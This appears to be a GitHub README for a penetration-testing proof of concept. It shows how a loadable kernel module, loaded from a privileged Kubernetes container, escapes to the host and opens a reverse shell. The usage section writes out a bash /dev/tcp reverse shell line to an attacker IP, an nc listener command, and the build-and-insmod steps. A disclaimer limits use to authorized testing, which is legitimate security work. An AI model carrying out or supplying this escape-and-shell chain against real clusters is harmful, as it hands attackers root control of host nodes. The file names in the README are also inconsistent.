# 🛠️ Kernel Module Reverse Shell – Privileged Container Escape PoC

This repository demonstrates a real-world **container escape technique** using a custom **Linux Kernel Module (LKM)** to spawn a reverse shell from within a `--privileged` Kubernetes container.

Featured in [RBT Security’s Kubernetes Penetration Testing – Part Three](https://www.rbtsec.com/blog/kubernetes-pentesting-part-three), this proof-of-concept shows how attackers can go beyond the container boundary and **execute commands directly on the host**.

> ⚠️ **For educational and authorized testing only.**  
> Do NOT run this code in any environment you do not own or have explicit permission to test.

---

### 🔍 About LKM (350-char Description)  
A Loadable Kernel Module (LKM) lets code run in kernel space without rebooting. When used from a privileged Kubernetes container, it can enable full host compromise. This PoC shows how attackers exploit SSTI, load a reverse shell LKM, and escape the container to gain root access on the Node.

---

## 🚀 How It Works

1. The attacker exploits a vulnerability (e.g., SSTI) to gain code execution inside a **privileged container**.  
2. A **custom kernel module** is compiled and injected from inside the container, with the reverse shell IP and port hardcoded in the source code.  
3. Once loaded, the module uses `call_usermodehelper()` to initiate a **reverse shell** to the attacker’s listener.  
4. Since the container runs with full kernel capabilities (e.g., `CAP_SYS_MODULE`), this grants **host-level command execution**.

---

## 📁 Files

- `k8s-lkm-reverse-shell.c`: The kernel module source code  
- `Makefile`: Used to compile the module for the target kernel

---

## 💻 Usage

```bash
# Step 1: Install dependencies inside the container
apt update
apt install -y build-essential linux-headers-$(uname -r)

# Step 2: Edit the reverse shell IP and port in the C source file
# File: reverseshell_module.c
# Replace <your-ip> and <port> with your attacker's listener
static char command[50] = "bash -i >& /dev/tcp/<your-ip>/<port> 0>&1";

# Step 3: Compile the kernel module
make clean && make

# Step 4: Start your listener
nc -lvnp 6999

# Step 5: Load the kernel module (inside the container)
insmod reverseshell_module.ko
